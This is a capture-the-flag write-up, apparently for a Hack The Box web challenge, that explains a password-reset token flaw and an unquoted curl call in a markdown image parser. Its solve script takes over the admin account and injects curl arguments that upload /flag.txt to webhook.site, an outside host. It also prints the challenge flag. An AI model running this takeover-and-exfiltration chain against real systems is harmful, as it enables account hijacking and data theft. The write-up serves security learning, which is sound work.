---
created: 2024-12-13T14:12
updated: 2024-12-13T14:57
---

After using the app as intended, I think the solution is to reset someone else's password.

And after a bit of looking around this caught my attention.

```js [email-app/routes/index.js]
for (let item of response.data.items) {
    const recipients = item.Raw.To || [];
    if (recipients.some((recipient) => recipient === 'test@email.htb')) {
        mails.push(item);
    }
}
```

What if there are multiple recipients?

```python
url = "http://94.237.58.196:45364/reset-password/request"
response = requests.post(url, json={
    "email": ["test@email.htb", "admin@armaxis.htb"]
})
print(response.text) # User not found.
```

Sadly this didn't work.

And... I just realized that there is no email-token validation.

```js [challenge/routes/index.js]
const reset = await getPasswordReset(token);
if (!reset) return res.status(400).send("Invalid or expired token.");
```

Login Success.

## Command Injection?

There appears to be command injection.

```js [challenge/routes/index.js]
router.post("/weapons/dispatch", authenticate, async (req, res) => {;
  ...
  const { name, price, note, dispatched_to } = req.body;
  ...
    const parsedNote = parseMarkdown(note);
  ...
});
```

```js [challenge/markdown.js]
try {
    const fileContent = execSync(`curl -s ${url}`);
    const base64Content = Buffer.from(fileContent).toString('base64');
    return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
} catch (err) {
    console.error(`Error fetching image from URL ${url}:`, err.message);
    return `<p>Error loading image: ${url}</p>`;
}
```

The regex is simply matching anything that is of the format `![...](...)`, easy injection.

`curl` can be used to upload files via `curl -F "file=@path" url`

So to be elegant, I will not use random bash injection techniques.

## Solve

```python
import regex as re
import requests
s = requests.session()
t1 = "http://94.237.58.196:45364"  # main site
t2 = "http://94.237.58.196:44521"  # the email site

payload = '-F "file=@/flag.txt" https://webhook.site'

s.post(f"{t1}/reset-password/request", json={"email": "test@email.htb"})
token = re.search('Use this token to reset your password: ([0-9a-f]+)', s.get(t2).text).group(1)
s.post(f"{t1}/reset-password", json={"token": token, "newPassword": "password", "email": "admin@armaxis.htb"})

print(s.post(f"{t1}/login", json={"email": "admin@armaxis.htb", "password": "password"}).text)
print(s.post(f"{t1}/weapons/dispatch", json={"name": "hello", "price": 123, "note": f"![]({payload})", "dispatched_to": "admin@armaxis.htb"}).text)
```

```flag
HTB{l00k0ut_f0r_m4rkd0wn_LF1_1n_w1ld!_93d0b106b05aee3323f0425d988419d8}
```
